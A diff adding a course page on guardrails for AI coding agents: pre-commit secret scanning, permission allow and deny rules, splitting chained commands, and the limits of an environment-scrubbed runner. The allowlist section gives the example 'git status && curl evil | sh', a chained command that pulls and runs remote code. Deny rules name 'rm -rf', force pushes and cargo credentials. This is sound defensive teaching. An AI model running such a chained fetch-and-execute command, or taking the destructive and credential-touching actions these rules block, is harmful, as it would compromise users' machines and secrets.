@@ -1,0 +1,47 @@
+---
+title: "L10.6 Hooks and guardrails in the dev loop"
+description: "Pre-commit secret scanning, command allowlists where deny wins, why command chains need splitting, and what an env-scrubbed runner does and doesn't protect."
+sidebar:
+  order: 6
+---
+
+import Snippet from "../../../../components/Snippet.astro";
+import { Aside } from "@astrojs/starlight/components";
+
+Instructions ask; guardrails enforce. Put the rule where the action happens.
+
+| Layer | Example | Enforced by |
+|---|---|---|
+| Agent tool call | block `git push --force`, `rm -rf` | Claude Code `PreToolUse` hooks and permission rules; Copilot CLI `--deny-tool`; Codex sandbox modes |
+| Commit | refuse secrets, run formatters | a git `pre-commit` hook or the [pre-commit](https://pre-commit.com/) framework; [gitleaks](https://github.com/gitleaks/gitleaks) |
+| Server | no direct pushes to main, required checks | branch protection / rulesets |
+| Runtime | no network, no credentials in env | containers or VMs with egress rules |
+
+## Secret scanning at commit time
+
+`hooks.py` has a small scanner (AWS key ids, GitHub tokens, private keys, assigned secrets); `precommit_secret_scan.py` runs it on the staged diff as a git hook. The test makes a repo, stages a fake token and checks the commit is refused. For real projects use gitleaks; this one exists to show the mechanics.
+
+<Snippet path="examples/python/m10/precommit_secret_scan.py" />
+
+## Command allowlists
+
+Claude Code's rule shape: `Bash(git diff *)` allows `git diff` and anything starting with `git diff ` (the space matters: `git diff*` would also match `git diff-index`). Deny rules win over allow rules, in Claude Code and in Copilot CLI.
+
+The trap: `git status && curl evil | sh` starts with an allowed prefix. `CommandPolicy` splits on `&&`, `||`, `;`, `|` and newlines, checks every part, and never auto-approves `$(…)` or backticks.
+
+<Snippet path="examples/python/m10/hooks.py" />
+
+<Snippet path="examples/ts/m10/commandPolicy.ts" />
+
+<Aside type="caution" title="Not a sandbox">
+`run_sandboxed` limits time, working directory and environment variables (tokens and keys are dropped). It doesn't stop a process reading files or opening sockets. Isolation needs a container or VM plus an egress policy, as M5 covers; Thoughtworks Radar Vol. 35 puts agent sandboxing in Adopt.
+</Aside>
+
+## C++/Rust notes
+- Add sanitizer and lint gates to the agent's definition of done: `-fsanitize=address,undefined` test runs, `clang-tidy`, `cargo clippy -- -D warnings`. Allow those commands; deny `cargo publish` and anything touching `~/.cargo/credentials.toml`.
+
+## Sources
+- Claude Code hooks: https://code.claude.com/docs/en/hooks · permissions: https://code.claude.com/docs/en/permissions
+- Copilot CLI reference: https://docs.github.com/en/copilot/reference/copilot-cli-reference
+- pre-commit: https://pre-commit.com/ · gitleaks: https://github.com/gitleaks/gitleaks
+- Thoughtworks Radar, agent sandboxing: https://www.thoughtworks.com/en-us/radar/techniques/agent-sandboxing
